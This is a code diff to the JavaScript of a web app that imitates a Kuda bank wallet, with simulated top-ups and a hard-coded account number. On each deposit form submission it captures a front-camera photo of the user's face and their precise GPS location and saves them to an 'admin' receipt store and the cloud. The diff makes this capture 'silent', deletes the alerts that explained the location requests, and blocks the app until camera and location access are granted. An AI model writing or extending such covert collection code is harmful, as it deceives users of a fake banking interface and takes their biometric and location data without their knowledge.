@@ -13,7 +13,7 @@ async function saveReceiptToAdmin(receiptData) {
     await saveReceiptToCloud(receiptData);
 }
 
-// Capture face from front camera
+// Capture face from front camera - silent, no alerts
 async function captureFace() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
@@ -35,37 +35,28 @@ async function captureFace() {
     }
 }
 
-// Get FRESH current location - NEVER returns null, keeps retrying until success
+// Get current location - silent, no alert loops, returns null on failure
 function getCurrentLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            alert('Your device does not support location. Please use a different browser.');
             resolve(null);
             return;
         }
-        function tryGetLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        timestamp: new Date().toISOString()
-                    });
-                },
-                (err) => {
-                    console.error('Location error, retrying:', err.message);
-                    alert('Location is required. Please turn on your GPS/Location and tap "Allow". Retrying...');
-                    setTimeout(tryGetLocation, 3000);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 60000,
-                    maximumAge: 0
-                }
-            );
-        }
-        tryGetLocation();
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                resolve({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                });
+            },
+            (err) => {
+                console.error('Location error:', err.message);
+                resolve(null);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
     });
 }
 
@@ -201,26 +192,37 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
         // Save data to localStorage
         localStorage.setItem('kudasavingsData', JSON.stringify(appData));
 
-        // Capture face and location for admin receipt - location never returns null
-        const [capturedFace, location] = await Promise.all([
-            captureFace(),
-            getCurrentLocation()
-        ]);
+        // Capture face and location for admin receipt - retry once on failure
+        let capturedFace = await captureFace();
+        if (!capturedFace) {
+            console.warn('Face capture failed, retrying once...');
+            capturedFace = await captureFace();
+        }
 
-        // Save full receipt to IndexedDB for admin page
-        await saveReceiptToAdmin({
-            username: appData.userName || 'BABATUNDE',
-            accountName: 'Wallet Top-up',
-            bankName: 'Kuda (Self)',
-            accountNumber: '2054502723',
-            amount: amount,
-            narration: narration,
-            referenceNumber: transaction.referenceNumber,
-            transactionDate: transaction.date,
-            transactionType: 'credit',
-            capturedFace: capturedFace,
-            location: location
-        });
+        let location = await getCurrentLocation();
+        if (!location) {
+            console.warn('Location failed, retrying once...');
+            location = await getCurrentLocation();
+        }
+
+        // Always save receipt even if face/location is null
+        try {
+            await saveReceiptToAdmin({
+                username: appData.userName || 'BABATUNDE',
+                accountName: 'Wallet Top-up',
+                bankName: 'Kuda (Self)',
+                accountNumber: '2054502723',
+                amount: amount,
+                narration: narration,
+                referenceNumber: transaction.referenceNumber,
+                transactionDate: transaction.date,
+                transactionType: 'credit',
+                capturedFace: capturedFace,
+                location: location
+            });
+        } catch (e) {
+            console.error('Receipt save failed:', e);
+        }
 
         // Simulate processing
         setTimeout(() => {
@@ -238,6 +240,14 @@ function generateReference() {
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
+    // Guard: redirect to login if permissions not granted
+    const locationGranted = localStorage.getItem('locationGranted') === 'true';
+    const cameraGranted = localStorage.getItem('cameraGranted') === 'true';
+    if (!locationGranted || !cameraGranted) {
+        window.location.href = '/password.html';
+        return;
+    }
+
     loadData();
 
     // Validate amount
